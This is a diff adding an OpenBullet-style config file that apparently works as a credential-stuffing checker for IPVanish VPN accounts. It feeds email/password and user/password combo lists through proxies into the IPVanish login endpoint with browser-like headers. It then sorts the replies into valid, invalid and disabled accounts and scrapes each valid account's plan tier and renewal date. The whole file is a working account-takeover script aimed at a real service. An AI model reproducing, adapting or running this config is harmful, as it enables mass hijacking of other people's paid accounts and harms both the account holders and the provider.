@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "CreatorLK": "OB-43116aaacbf06bd46f32853186d73344-LoliKEY",
+  "Name": "IPVanish",
+  "SuggestedBots": 100,
+  "LastModified": "2019-05-21T22:47:54.8233007+00:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Airbomber (loliX Encrypted)",
+  "Version": "1.2.2.4",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://account.ipvanish.com/login/validate" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 49" 
+  HEADER "origin: https://account.ipvanish.com" 
+  HEADER "referer: https://account.ipvanish.com/login" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, your account credentials are invalid. " 
+  KEYCHAIN Success OR 
+    KEY "logout" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Your service has been temporarily disabled.  " 
+
+#Plan_Capture PARSE "<SOURCE>" LR "<span class=\"profile_label\"><b>Current Tier:</b></span>" "</span>" -> VAR "Plan0" 
+
+#Plan_Fix FUNCTION Replace "<span class=\"profile_label\">" " " "<Plan0>" -> CAP "Plan" 
+
+#Renewal PARSE "<SOURCE>" LR "<span class=\"profile_label\"><b>Renewal Date:</b></span>" "</span>" -> VAR "Renewal Date0" 
+
+#Renewal_Fix FUNCTION Replace "<span class=\"profile_label\">" " " "<Renewal Date0>" -> CAP "Renewal Date" 
+
+                                
